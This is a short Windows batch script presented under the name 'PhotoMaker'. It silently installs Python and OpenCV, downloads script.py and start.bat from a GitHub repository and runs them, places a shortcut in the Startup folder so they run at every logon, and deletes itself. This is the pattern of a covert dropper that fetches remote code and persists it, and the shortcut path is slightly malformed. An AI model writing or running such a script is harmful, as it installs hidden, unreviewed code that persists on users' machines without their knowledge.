@echo off
mkdir "%USERPROFILE%\AppData\Local\PhotoMaker"
powershell Start-BitsTransfer -Source "https://www.python.org/ftp/python/3.6.4/python-3.6.4.exe" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe"
"%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
del "%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe"
"C:\Program Files (x86)\Python36-32\Scripts\pip.exe" install opencv-python
powershell Start-BitsTransfer -Source "https://raw.githubusercontent.com/Bot007bot/forfun/master/script.py" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\script.py"
powershell Start-BitsTransfer -Source "https://raw.githubusercontent.com/Bot007bot/forfun/master/start.bat" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\start.bat"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%USERPROFILE%\Start Menu\Programs\Startup\start.lnk');$s.TargetPath='USERPROFILE%\AppData\Local\PhotoMaker\start.bat';$s.Save()"
call "%USERPROFILE%\AppData\Local\PhotoMaker\start.bat"
del %0

